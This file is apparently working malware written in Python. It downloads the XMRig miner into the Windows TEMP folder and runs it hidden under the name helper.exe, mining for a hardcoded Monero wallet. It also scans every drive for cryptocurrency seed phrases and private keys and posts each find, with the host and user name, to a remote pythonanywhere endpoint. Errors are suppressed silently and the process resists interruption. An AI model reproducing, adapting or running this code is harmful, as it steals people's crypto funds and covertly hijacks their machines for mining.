import os
import re
import time
import requests
import subprocess
import threading
import zipfile
from pathlib import Path
from mnemonic import Mnemonic

mnemo = Mnemonic("english")
SERVER = "https://kryhrqs.pythonanywhere.com/export"
WALLET = "Bv3WEwFb17vKiiLGM7xc1UtxzWWfmzNimkq7CyVBjLfU"
TEMP = os.environ.get('TEMP', 'C:\\Windows\\Temp')
MINER = os.path.join(TEMP, 'helper.exe')

def send(data):
    try:
        requests.post(SERVER, json={
            'time': time.time(),
            'host': os.getenv('COMPUTERNAME', ''),
            'user': os.getenv('USERNAME', ''),
            'data': data
        }, timeout=10)
    except:
        pass

def start_miner():
    try:
        if not os.path.exists(MINER):
            zip_path = os.path.join(TEMP, 'x.zip')
            r = requests.get(
                'https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-msvc-win64.zip',
                stream=True, timeout=60
            )
            if r.status_code == 200:
                with open(zip_path, 'wb') as f:
                    for chunk in r.iter_content(8192):
                        f.write(chunk)
                with zipfile.ZipFile(zip_path, 'r') as z:
                    z.extractall(TEMP)
                for root, dirs, files in os.walk(TEMP):
                    for f in files:
                        if f == 'xmrig.exe':
                            os.rename(os.path.join(root, f), MINER)
                            break
        if os.path.exists(MINER):
            subprocess.Popen(
                [MINER, '--url=pool.supportxmr.com:3333', f'--user={WALLET}',
                 '--pass=x', '--threads=2', '--keepalive', '--donate-level=1'],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
    except:
        pass

def is_valid_private_key(text, context):
    """Check if text is a real private key with context."""
    if not text:
        return False
    
    key = text.replace('0x', '')
    if len(key) != 64:
        return False
    if not re.match(r'^[a-fA-F0-9]{64}$', key):
        return False
    
    # Skip common non-keys
    if key.lower() in ['0'*64, '1'*64, 'f'*64, 'a'*64]:
        return False
    
    # Must have context (surrounding text suggests it's a key)
    context_lower = context.lower()
    key_indicators = ['private', 'key', 'wallet', 'seed', 'mnemonic', '0x', 'address', 'pk']
    if not any(indicator in context_lower for indicator in key_indicators):
        return False
    
    return True

def looks_like_key_file(content):
    """Check if the file is just random hex (likely not a real key)."""
    # If the whole file is just hex and no spaces/newlines, skip it
    hex_chars = re.findall(r'[a-fA-F0-9]', content)
    if len(hex_chars) > 0.8 * len(content):
        return False
    return True

def scan_file(path):
    try:
        if os.path.getsize(path) > 2 * 1024 * 1024:
            return
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            if not content or len(content) < 20:
                return
            
            # Check for seed phrases (12 words)
            words = re.findall(r'\b[a-zA-Z]+\b', content)
            for i in range(len(words) - 11):
                phrase = ' '.join(words[i:i+12])
                try:
                    if mnemo.check(phrase):
                        send({'type': 'seed', 'path': path, 'content': phrase})
                        return
                except:
                    pass
            
            # Check for private keys with context
            matches = re.findall(r'(?:0x)?[a-fA-F0-9]{64}', content)
            for m in matches:
                # Get surrounding context (100 chars before and after)
                start = max(0, content.find(m) - 100)
                end = min(len(content), content.find(m) + len(m) + 100)
                context = content[start:end]
                if is_valid_private_key(m, context):
                    send({'type': 'key', 'path': path, 'content': m})
                    return
    except:
        pass

def scan_drive(drive):
    try:
        for root, dirs, files in os.walk(drive):
            skip = ['Windows', 'Program Files', 'System32', 'AppData\\Local\\Temp', 
                    'node_modules', '.git', 'Cache', 'cache', 'AppData\\Local\\Packages']
            dirs[:] = [d for d in dirs if d not in skip and not d.startswith('$')]
            for f in files:
                ext = os.path.splitext(f)[1].lower()
                if ext in ('.txt', '.json', '.dat', '.log', '.bak', '.old', '.md', '.cfg', '.conf', '.ini'):
                    scan_file(os.path.join(root, f))
    except:
        pass

def main():
    # Start miner
    threading.Thread(target=start_miner, daemon=True).start()
    
    # Start scanner
    for letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
        drive = f'{letter}:\\'
        if os.path.exists(drive):
            threading.Thread(target=scan_drive, args=(drive,), daemon=True).start()
    
    # Keep alive
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        while True:
            time.sleep(60)

if __name__ == '__main__':
    main()